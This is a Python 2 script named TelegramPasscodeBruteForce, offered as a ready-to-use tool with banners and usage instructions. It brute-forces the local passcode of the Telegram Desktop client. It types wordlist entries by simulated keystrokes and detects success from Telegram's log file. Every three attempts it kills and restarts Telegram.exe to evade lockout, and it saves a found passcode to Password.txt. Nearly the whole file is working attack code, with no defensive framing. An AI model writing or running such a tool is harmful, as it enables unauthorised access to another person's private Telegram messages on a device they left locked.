import sys
import keyboard
from time import time,sleep
from datetime import datetime
from os import system,path,getcwd
from subprocess import Popen,PIPE
from thread import start_new_thread
system("cls")
system("color 9")
print '''
 _______   _                                   __  _____             __  
|__   __| | |                                 / / |  __ \            \ \ 
   | | ___| | ___  __ _ _ __ __ _ _ __ ___   | |  | |  | | ___  ___   | |
   | |/ _ \ |/ _ \/ _` | '__/ _` | '_ ` _ \  | |  | |  | |/ _ \/ __|  | |
   | |  __/ |  __/ (_| | | | (_| | | | | | | | |  | |__| |  __/\__ \  | |
   |_|\___|_|\___|\__, |_|  \__,_|_| |_| |_| | |  |_____/ \___||___/  | |
                   __/ |                      \_\                    /_/ 
                  |___/                                                  
'''
sleep(2)
system("cls&&color a")
print '''
$$$$$$$\                                                         $$\           
$$  __$$\                                                        $$ |          
$$ |  $$ |$$$$$$\   $$$$$$$\  $$$$$$$\  $$$$$$$\  $$$$$$\   $$$$$$$ | $$$$$$\  
$$$$$$$  |\____$$\ $$  _____|$$  _____|$$  _____|$$  __$$\ $$  __$$ |$$  __$$\ 
$$  ____/ $$$$$$$ |\$$$$$$\  \$$$$$$\  $$ /      $$ /  $$ |$$ /  $$ |$$$$$$$$ |
$$ |     $$  __$$ | \____$$\  \____$$\ $$ |      $$ |  $$ |$$ |  $$ |$$   ____|
$$ |     \$$$$$$$ |$$$$$$$  |$$$$$$$  |\$$$$$$$\ \$$$$$$  |\$$$$$$$ |\$$$$$$$\ 
\__|      \_______|\_______/ \_______/  \_______| \______/  \_______| \_______|
                                                                               
                                                                               
'''
sleep(2)
system("cls&&color 4")
print '''                                                                                                               

$$$$$$$\                        $$\               $$$$$$$$\                                      
$$  __$$\                       $$ |              $$  _____|                                     
$$ |  $$ | $$$$$$\  $$\   $$\ $$$$$$\    $$$$$$\  $$ |    $$$$$$\   $$$$$$\   $$$$$$$\  $$$$$$\  
$$$$$$$\ |$$  __$$\ $$ |  $$ |\_$$  _|  $$  __$$\ $$$$$\ $$  __$$\ $$  __$$\ $$  _____|$$  __$$\ 
$$  __$$\ $$ |  \__|$$ |  $$ |  $$ |    $$$$$$$$ |$$  __|$$ /  $$ |$$ |  \__|$$ /      $$$$$$$$ |
$$ |  $$ |$$ |      $$ |  $$ |  $$ |$$\ $$   ____|$$ |   $$ |  $$ |$$ |      $$ |      $$   ____|
$$$$$$$  |$$ |      \$$$$$$  |  \$$$$  |\$$$$$$$\ $$ |   \$$$$$$  |$$ |      \$$$$$$$\ \$$$$$$$\ 
\_______/ \__|       \______/    \____/  \_______|\__|    \______/ \__|       \_______| \_______|
                                                                                                 
                                                                                                 
                                                                                                 
                                                  
'''
sleep(2)
system("cls&&color 6")
print "#########################################################"
print "#                                                       #"
print "#                                                       #"
print "#     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+         #"
print "#     |I|n|s|t|a|g|r|a|m|:|S|r|d|r|N|a|g|h|d|i|         #"
print "#     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+         #"
print "#             TelegramPasscodeBruteForce                #"
print "#                       (TPBF)                          #"
print "#                                                       #"
print "#                                                       #"
print "#########################################################"
print "It is advisable to open the telegram before running the program and execute the script in 'CMD'"
current_directory = str(getcwd())
def ex():
    sys.exit()
try:
    passlist = open(sys.argv[1], 'r').read().splitlines()
except:
    print "Usage:\npython TelegramPasscodeBruteForce.py passlist.txt"
    ex()
def tryed(data):
    c = str(datetime.now())[:19]+"\n"
    t = open("tryed.txt","a")
    t.write(("{:<15}|  {:<}".format(data,c)))
    t.close()
def bruteforce():
    counter = 0
    for key in passlist:
        key = str(key)
        keyboard.write(key)
        keyboard.send("enter")
        sleep(.3)
        t = open(current_directory+"\\log.txt","r")
        t1 = t.read()
        t.close()
        start_new_thread(tryed,(key,))
        if "reading encrypted user settings" in t1:
            system("color a")
            total_time2 = time()
            total_time = str(total_time2 - total_time1)+" Second"
            ins = "\nTotal Time: "+"\n"+"+-"*20+"+"+"\n"+"|I|n|s|t|a|g|r|a|m|:|S|r|d|r|N|a|g|h|d|i|"+"\n"+"+-"*20+"+"
            mes = "Passcode:\n"+key+" ==> "+str(datetime.now())[:19]+"\n"+total_time+ins
            t = open("Password.txt","w+")
            t.write(mes)
            t.close()
            print "\n\n"+mes
            ex()
        c = "Checked: "+str(datetime.now())[:19]
        print ("{:<10}|  {:<}".format(key,c))
        counter+=1
        if counter == 3:
            counter=0
            tkot()
    total_time2 = time()
    total_time = "Total Time:\n"+str(total_time2 - total_time1)+" Second"
    print "Passcode Not Find :("
    Popen("taskkill -f /IM Telegram.exe" , shell=True , stdout = PIPE,stderr=PIPE,stdin=PIPE)
#TaskKill and OpenTelegram(T-K-O-T)
def tkot():
    order = "taskkill -f /IM Telegram.exe"
    cmd = Popen(order , shell=True , stdout = PIPE,stderr=PIPE,stdin=PIPE)
    cmd.stdout.read()+cmd.stderr.read()
    order = "start " +current_directory+"\\Telegram.exe"
    Popen(order , shell=True , stdout = PIPE,stderr=PIPE,stdin=PIPE)
    sleep(5.5)
if path.exists("Telegram.exe") == True:
    total_time1 = time()
    tkot()
    bruteforce()
else:
    print "Please copy this script to the Telegram.exe Directory"

